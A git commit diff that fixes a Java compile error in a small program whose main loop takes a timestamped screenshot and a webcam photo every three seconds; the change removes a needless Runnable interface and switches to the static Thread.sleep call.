6c4f95a96108d4ee5195acff6c8cbbc76f72a4c2
Aksh Desai <dev.akshdesai@gmail.com>
2022-03-11 16:08:18 +0530

    Compile issue solved

--- src/Main.java
+++ src/Main.java
@@ -4,10 +4,8 @@ import java.io.IOException;
 import java.time.format.DateTimeFormatter;
 import java.time.LocalDateTime;
 
-class Main implements Runnable {
+class Main {
     public static void main(String[] args) {
-
-        Thread MainThread = new Thread();
 
         DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH-mm---ss dd-MM-yyyy");
         while(true) {
@@ -15,7 +13,7 @@ class Main implements Runnable {
                 LocalDateTime now = LocalDateTime.now();
                 TakeScreenshot.Take_Screenshot(dtf.format(now));
                 SmilePlease.Take_Selfie();
-                MainThread.sleep(3000);
+                Thread.sleep(3000);
             }
             catch (InterruptedException E) {
                 System.out.println(E);
